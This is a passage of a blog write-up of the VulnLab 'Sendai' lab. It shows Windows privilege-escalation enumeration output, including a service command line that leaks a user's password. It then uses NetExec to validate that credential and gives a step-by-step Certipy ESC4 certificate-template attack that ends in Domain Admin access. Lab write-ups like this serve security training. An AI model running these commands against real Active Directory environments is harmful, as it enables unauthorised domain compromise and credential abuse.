┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ CATEGORY ┃ TA0043 - Reconnaissance ┃  
┃ NAME ┃ User identity ┃  
┃ TYPE ┃ Base ┃  
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Get information about the current user (name, domain name) ┃  
┃ and its access token (SID, integrity level, authentication ┃  
┃ ID). ┃  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
  
Name : SENDAI\mgtsvc$  
SID : S-1-5-21-3085872742-570972823-736764132-1130  
IntegrityLevel : Medium Plus Mandatory Level (S-1-16-8448)  
SessionId : 0  
TokenId : 00000000-00c8e314  
AuthenticationId : 00000000-00c7132b  
OriginId : 00000000-00000000  
ModifiedId : 00000000-00c71332  
Source : NtLmSsp (00000000-00000000)  
  
  
  
[*] Status: Informational - Severity: None - Execution time: 00:00:00.377  
  
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ CATEGORY ┃ TA0043 - Reconnaissance ┃  
┃ NAME ┃ User groups ┃  
┃ TYPE ┃ Base ┃  
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Get information about the groups the current user belongs to ┃  
┃ (name, type, SID). ┃  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
  
Name Type SID  
---- ---- ---  
SENDAI\Domain Computers Group S-1-5-21-3085872742-570972823-736764132-515  
Everyone WellKnownGroup S-1-1-0  
BUILTIN\Remote Management Users Alias S-1-5-32-580  
BUILTIN\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554  
BUILTIN\Users Alias S-1-5-32-545  
BUILTIN\Certificate Service DCOM Access Alias S-1-5-32-574  
NT AUTHORITY\NETWORK WellKnownGroup S-1-5-2  
NT AUTHORITY\Authenticated Users WellKnownGroup S-1-5-11  
NT AUTHORITY\This Organization WellKnownGroup S-1-5-15  
NT AUTHORITY\NTLM Authentication WellKnownGroup S-1-5-64-10  
Mandatory Label\Medium Plus Mandatory Level Label S-1-16-8448  
  
  
[*] Status: Informational - Severity: None - Execution time: 00:00:00.119  
  
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ CATEGORY ┃ TA0004 - Privilege Escalation ┃  
┃ NAME ┃ User privileges ┃  
┃ TYPE ┃ Base ┃  
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Check whether the current user is granted privileges that ┃  
┃ can be leveraged for local privilege escalation. ┃  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
  
Name State Description Exploitable  
---- ----- ----------- -----------  
SeMachineAccountPrivilege Enabled Add workstations to domain False  
SeChangeNotifyPrivilege Enabled Bypass traverse checking False  
SeIncreaseWorkingSetPrivilege Enabled Increase a process working set False  
  
  
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.109  
  
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ CATEGORY ┃ TA0004 - Privilege Escalation ┃  
┃ NAME ┃ User privileges (GPO) ┃  
┃ TYPE ┃ Base ┃  
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Check whether the current user is granted privileges, ┃  
┃ through a group policy, that can be leveraged for local ┃  
┃ privilege escalation. ┃  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
[*] Status: Informational (not vulnerable) - Severity: None - Execution time: 00:00:00.082  
  
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ CATEGORY ┃ TA0006 - Credential Access ┃  
┃ NAME ┃ User environment variables ┃  
┃ TYPE ┃ Base ┃  
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Check whether any environment variables contain sensitive ┃  
┃ information such as credentials or secrets. Note that this ┃  
┃ check follows a keyword-based approach and thus might not be ┃  
┃ completely reliable. ┃  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
[*] Status: Informational (nothing found) - Severity: None - Execution time: 00:00:00.030  
  
┏━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓  
┃ CATEGORY ┃ TA0004 - Privilege Escalation ┃  
┃ NAME ┃ Service list (non-default) ┃  
┃ TYPE ┃ Base ┃  
┣━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫  
┃ Get information about third-party services. It does so by ┃  
┃ parsing the target executable's metadata and checking ┃  
┃ whether the publisher is Microsoft. ┃  
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛  
  
  
Name : Amazon EC2Launch  
DisplayName : Amazon EC2Launch  
ImagePath : "C:\Program Files\Amazon\EC2Launch\service\EC2LaunchService.exe"  
User : LocalSystem  
StartMode : Automatic  
  
Name : AmazonSSMAgent  
DisplayName : Amazon SSM Agent  
ImagePath : "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"  
User : LocalSystem  
StartMode : Automatic  
  
Name : AWSLiteAgent  
DisplayName : AWS Lite Guest Agent  
ImagePath : "C:\Program Files\Amazon\XenTools\LiteAgent.exe"  
User : LocalSystem  
StartMode : Automatic  
  
Name : MSSQL$SQLEXPRESS  
DisplayName : SQL Server (SQLEXPRESS)  
ImagePath : "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlservr.exe" -sSQLEXPRESS  
User : SENDAI\sqlsvc  
StartMode : Automatic  
  
Name : PsShutdownSvc  
DisplayName : PsShutdown  
ImagePath : C:\Windows\PSSDNSVC.EXE  
User : LocalSystem  
StartMode : Manual  
  
Name : SQLAgent$SQLEXPRESS  
DisplayName : SQL Server Agent (SQLEXPRESS)  
ImagePath : "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\SQLAGENT.EXE" -i SQLEXPRESS  
User : NT AUTHORITY\NETWORKSERVICE  
StartMode : Disabled  
  
Name : SQLBrowser  
DisplayName : SQL Server Browser  
ImagePath : "C:\Program Files (x86)\Microsoft SQL Server\90\Shared\sqlbrowser.exe"  
User : NT AUTHORITY\LOCALSERVICE  
StartMode : Disabled  
  
Name : SQLTELEMETRY$SQLEXPRESS  
DisplayName : SQL Server CEIP service (SQLEXPRESS)  
ImagePath : "C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\Binn\sqlceip.exe" -Service SQLEXPRESS  
User : NT Service\SQLTELEMETRY$SQLEXPRESS  
StartMode : Automatic  
  
Name : SQLWriter  
DisplayName : SQL Server VSS Writer  
ImagePath : "C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe"  
User : LocalSystem  
StartMode : Automatic  
  
Name : ssh-agent  
DisplayName : OpenSSH Authentication Agent  
ImagePath : C:\Windows\System32\OpenSSH\ssh-agent.exe  
User : LocalSystem  
StartMode : Disabled  
  
Name : Support  
DisplayName :  
ImagePath : C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB------ -k netsvcs 😱😱  
User : LocalSystem  
StartMode : Automatic  
  
Name : VGAuthService  
DisplayName : VMware Alias Manager and Ticket Service
```

### Checking for ADCS Attacks — Because It Opens A LOT of Doors! 🚪🔓

Since we’ve got **Clifford.Davey’s credentials**, it’s time to **check for ADCS misconfigurations**! 🏛️💀

ADCS attacks are **one of the most important things to check** in an **Active Directory environment** because they can open **a TON of attack paths** — from **Privilege Escalation** to **Domain Compromise**. 🔥

Let’s see if **ESC4** or any other misconfiguration is waiting for us! 😈

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc smb sendai.vl -u 'clifford.davey' -p RFmoB----gE_3p  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
SMB 10.10.106.182 445 DC [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc winrm sendai.vl -u 'clifford.davey' -p RFmoB--E_3p  
WINRM 10.10.106.182 5985 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl)  
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.  
arc4 = algorithms.ARC4(self._key)  
WINRM 10.10.106.182 5985 DC [-] sendai.vl\clifford.davey:RFmoB2WplgE_3p  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc ldap sendai.vl -u 'clifford.davey' -p RFmoB2---_3p  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.106.182 389 DC [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p  
  
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# nxc ldap sendai.vl -u 'clifford.davey' -p RFmoB--- -M adcs  
SMB 10.10.106.182 445 DC [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)  
LDAP 10.10.106.182 389 DC [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p  
ADCS 10.10.106.182 389 DC [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'  
ADCS 10.10.106.182 389 DC Found PKI Enrollment Server: dc.sendai.vl  
ADCS 10.10.106.182 389 DC Found CN: sendai-DC-CA  
ADCS 10.10.106.182 389 DC Found PKI Enrollment WebService: https://dc.sendai.vl/sendai-DC-CA_CES_Kerberos/service.svc/CES
```

![](https://cdn-images-1.medium.com/max/800/1*tXevBba_PBOipE15Q0arQQ.png)

### Privilege Escalation via ESC4 Clifford.Davey’s Golden Ticket 🎟️

Looking back at **BloodHound**, we spot something juicy **Clifford.Davey** is in the **CA Operators group**. And you know what that means? **ESC4 attack time!**

From our **NetExec results**, we see that there’s a **SendaiComputer template** with **Client Authentication EKU** enabled. Since **CA Operators have full control over this template**, we can **modify it** and issue ourselves a certificate to impersonate a **Domain Admin**.

This is classic **ESC4 (Access Control) abuse**, and it’s about to give us **the keys to the kingdom!** Let’s make it happen!

```bash
┌──(root㉿kali)-[/home/kali/VulnLab/sendai]  
└─# certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.106.182 -stdout -debug  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
Password:  
[+] Trying to resolve 'dc.sendai.vl' at '10.10.106.182'  
[+] Authenticating to LDAP server  
[+] Bound to ldaps://10.10.106.182:636 - ssl  
[+] Default path: DC=sendai,DC=vl  
[+] Configuration path: CN=Configuration,DC=sendai,DC=vl  
[+] Adding Domain Computers to list of current user's SIDs  
[+] List of current user's SIDs:  
SENDAI.VL\Domain Users (S-1-5-21-3085872742-570972823-736764132-513)  
SENDAI.VL\Clifford Davey (S-1-5-21-3085872742-570972823-736764132-1122)  
SENDAI.VL\ca-operators (S-1-5-21-3085872742-570972823-736764132-1128)  
SENDAI.VL\Domain Computers (S-1-5-21-3085872742-570972823-736764132-515)  
SENDAI.VL\Everyone (SENDAI.VL-S-1-1-0)  
SENDAI.VL\staff (S-1-5-21-3085872742-570972823-736764132-1107)  
SENDAI.VL\Users (SENDAI.VL-S-1-5-32-545)  
SENDAI.VL\Authenticated Users (SENDAI.VL-S-1-5-11)  
[*] Finding certificate templates  
[*] Found 34 certificate templates  
[*] Finding certificate authorities  
[*] Found 1 certificate authority  
[*] Found 12 enabled certificate templates  
[+] Resolved 'dc.sendai.vl' from cache: 10.10.106.182  
[*] Trying to get CA configuration for 'sendai-DC-CA' via CSRA  
[+] Trying to get DCOM connection for: 10.10.106.182  
[!] Got error while trying to get CA configuration for 'sendai-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.  
[*] Trying to get CA configuration for 'sendai-DC-CA' via RRP  
[!] Failed to connect to remote registry. Service should be starting now. Trying again...  
[+] Connected to remote registry at 'dc.sendai.vl' (10.10.106.182)  
[*] Got CA configuration for 'sendai-DC-CA'  
[+] Resolved 'dc.sendai.vl' from cache: 10.10.106.182  
[+] Connecting to 10.10.106.182:80  
[*] Enumeration output:  
Certificate Authorities  
0  
CA Name : sendai-DC-CA  
DNS Name : dc.sendai.vl  
Certificate Subject : CN=sendai-DC-CA, DC=sendai, DC=vl  
Certificate Serial Number : 326E51327366FC954831ECD5C04423BE  
Certificate Validity Start : 2023-07-11 09:19:29+00:00  
Certificate Validity End : 2123-07-11 09:29:29+00:00  
Web Enrollment : Disabled  
User Specified SAN : Disabled  
Request Disposition : Issue  
Enforce Encryption for Requests : Enabled  
Permissions  
Owner : SENDAI.VL\Administrators  
Access Rights  
ManageCertificates : SENDAI.VL\Administrators  
SENDAI.VL\Domain Admins  
SENDAI.VL\Enterprise Admins  
ManageCa : SENDAI.VL\Administrators  
SENDAI.VL\Domain Admins  
SENDAI.VL\Enterprise Admins  
Enroll : SENDAI.VL\Authenticated Users  
Certificate Templates  
0  
Template Name : SendaiComputer  
Display Name : SendaiComputer  
Certificate Authorities : sendai-DC-CA  
Enabled : True  
Client Authentication : True  
Enrollment Agent : False  
Any Purpose : False  
Enrollee Supplies Subject : False  
Certificate Name Flag : SubjectAltRequireDns  
Enrollment Flag : AutoEnrollment  
Private Key Flag : 16842752  
Extended Key Usage : Server Authentication  
Client Authentication  
Requires Manager Approval : False  
Requires Key Archival : False  
Authorized Signatures Required : 0  
Validity Period : 100 years  
Renewal Period : 6 weeks  
Minimum RSA Key Length : 4096  
Permissions  
Enrollment Permissions  
Enrollment Rights : SENDAI.VL\Domain Admins  
SENDAI.VL\Domain Computers  
SENDAI.VL\Enterprise Admins  
Object Control Permissions  
Owner : SENDAI.VL\Administrator  
Full Control Principals : SENDAI.VL\ca-operators  
Write Owner Principals : SENDAI.VL\Domain Admins  
SENDAI.VL\Enterprise Admins  
SENDAI.VL\Administrator  
SENDAI.VL\ca-operators  
Write Dacl Principals : SENDAI.VL\Domain Admins  
SENDAI.VL\Enterprise Admins  
SENDAI.VL\Administrator  
SENDAI.VL\ca-operators  
Write Property Principals : SENDAI.VL\Domain Admins  
SENDAI.VL\Enterprise Admins  
SENDAI.VL\Administrator  
SENDAI.VL\ca-operators  
[!] Vulnerabilities  
ESC4 : 'SENDAI.VL\\ca-operators' has dangerous permissions
```

### Modifying the Template for ESC4 Abuse 🔧

From the **Certipy find** results, we can see that we have the ability to **modify the SendaiComputer template**. Using **Certipy**, we can tweak the configuration to **allow any domain user to enroll** and use it to impersonate **any user**, including Domain Admins. 😈🔥

> 🚨 Pro Tip: If you’re in a Red Team engagement , this is not the most OpSec-friendly approach. This modification is very noisy and will likely trigger alerts. Always consider stealthier alternatives before making changes that defenders can easily spot! 🚀

### Exploiting ESC4 with Certipy — Step by Step ⚡

To abuse **ESC4** and impersonate a **Domain Admin**, we’ll go through the following steps using **Certipy**.

---

### 1️⃣ Identify Vulnerable Certificate Templates

First, we need to find misconfigured **certificate templates** that we can exploit. We use `certipy find` to scan for **ESC4 (Access Control) abuse opportunities**:

🛠 **Command:**

```bash
certipy find -u clifford.davey -vulnerable -target dc.sendai.vl -dc-ip 10.10.106.182 -stdout -debug
```

This checks for vulnerable **certificate templates**, and from the output, we confirm that the **SendaiComputer template** is misconfigured. Since **Clifford.Davey** is in the **CA Operators group**, we can modify this template to let **any domain user enroll** for it.

---

### 2️⃣ Modify the Template to Allow Enrollment

Now that we found a vulnerable template, we modify it to allow **domain users to enroll** using the `certipy template` command:

🛠 **Command:**

```bash
certipy template -u clifford.davey -target dc.sendai.vl -dc-ip 10.10.106.182 -template SendaiComputer
```

This **modifies the certificate template** to allow us to **request a certificate** for any user, including **Domain Admins**.

---

### 3️⃣ Request a Certificate for Domain Admin

Now that we have control over the template, we can request a **certificate for the Administrator account**:

🛠 **Command:**

```bash
certipy req -u 'clifford.davey' -ca 'sendai-DC-CA' -dc-ip 10.10.106.182 -target dc.sendai.vl -template 'SendaiComputer' -upn administrator
```

This issues a **certificate for the Domain Admin (Administrator)**, which we can use to **authenticate as a Domain Admin**.

---

### 4️⃣ Authenticate as Domain Admin

Finally, we use `certipy auth` to authenticate as the **Administrator** using the issued certificate:

🛠 **Command:**

```bash
certipy auth -pfx ./administrator.pfx -domain sendai.vl
```

Boom! 💥 We now have **Domain Admin access**, all thanks to **ESC4 abuse**. Time to **own the domain**! 😈🔥

### Full Attack Path — Visualized

![](https://cdn-images-1.medium.com/max/1200/1*bwP27ktY3IPCAkczHp4nhQ.png)

### Final Words

And that’s a wrap, folks! 🎭 From SMB enumeration to full **Domain Admin** with **ESC4 abuse**, this box had everything password spraying, ADCS misconfigurations, and of course, **BloodHound doing its magic**. If you’ve made it this far, congratulations, you just rode the **Sendai rollercoaster** to pwnage!

**Lesson of the day?** Always enumerate, always check for GMSA & ADCS, and never underestimate **the power of misconfigurations.** Oh, and don’t forget **BloodHound is your best friend.** 🐺

Till next time, keep hacking and keep laughing!

---

### Do You Wanna Chat with Maverick?🥂

![](https://cdn-images-1.medium.com/max/800/0*6mYMjDsLJlSBpPwu.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking! 🚀

By Mohamed Eletreby on March 5, 2025.

Canonical link

Exported from Medium on April 20, 2026.